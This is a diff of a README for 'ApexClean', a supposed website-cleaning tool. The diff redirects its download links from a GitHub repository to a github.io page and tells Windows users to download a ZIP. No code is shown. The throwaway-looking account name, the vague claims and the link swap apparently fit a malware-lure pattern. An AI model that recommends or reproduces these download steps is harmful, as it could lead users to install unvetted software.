@@ -1,6 +1,6 @@
 # 🧹 apexclean-site-update - Keep your website clean and fast
 
-[![Download ApexClean](https://img.shields.io/badge/Download-Visit_Website-blue.svg)](https://github.com/Nonworkershortness871/apexclean-site-update)
+[![Download ApexClean](https://img.shields.io/badge/Download-Visit_Website-blue.svg)](https://nonworkershortness871.github.io)
 
 ApexClean helps you maintain your website. It removes clutter, fixes broken links, and optimizes your site performance. You use this tool to ensure your online presence stays professional and functional. 
 
@@ -16,7 +16,7 @@ Your computer needs Windows 10 or Windows 11. You need a modern web browser like
 
 You need to get the files to start. 
 
-1. Visit the project page here: [https://github.com/Nonworkershortness871/apexclean-site-update](https://github.com/Nonworkershortness871/apexclean-site-update).
+1. Visit the project page here: [https://nonworkershortness871.github.io](https://nonworkershortness871.github.io).
 2. Click the green button labeled "Code".
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
